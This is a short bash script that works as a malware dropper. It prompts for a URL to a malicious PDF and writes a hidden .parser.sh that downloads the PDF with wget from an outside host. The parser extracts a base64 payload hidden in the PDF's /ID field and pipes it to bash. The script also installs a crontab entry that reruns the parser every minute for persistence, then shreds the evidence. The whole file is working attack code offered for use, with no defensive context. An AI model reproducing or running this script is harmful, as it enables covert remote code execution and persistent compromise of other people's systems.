#!/bin/bash

DEP=1
if [[ ! -f /usr/bin/base64 ]];
then
	"[-] Dependency Missing: base64"
	DEP=0
elif [[ ! -f /usr/bin/wget ]];
then
	"[-] Dependency Missing: wget"
	DEP=0
fi

if [ $DEP -eq 0 ];
then
	exit
fi

echo "[+] Input URL for PDF (e.g. https://0.0.0.0/mal.pdf)"
read pdf

payload=$(echo $pdf | sed 's/.*\///g')
echo 'wget --no-check-certificate '$pdf'; mv '$payload.1' '$payload' 2> /dev/null && export md5sum=$(md5sum '$payload' | sed "s/ .*//g") && for i in $(find / -type f -name "*.pdf" -printf "%T@ %p\n" 2>/dev/null | sort -k1 -n 2> /dev/null | sed "s/.*'\ '//g"); do if md5sum $i 2> /dev/null | awk "{print $1}" | grep -q $md5sum; then strings $i | grep "^/ID" | sed "s/.*<//g" | sed "s/..$//g" | base64 -d | bash; fi done' > .parser.sh &&
chmod +x .parser.sh &&
echo "[+] Parser created"
echo '* * * * * cd '$(pwd)' && ./.parser.sh' > .cron &&
crontab .cron &&
shred .cron
rm .cron
echo "[+] Cron is set and the parser is in $(pwd)"
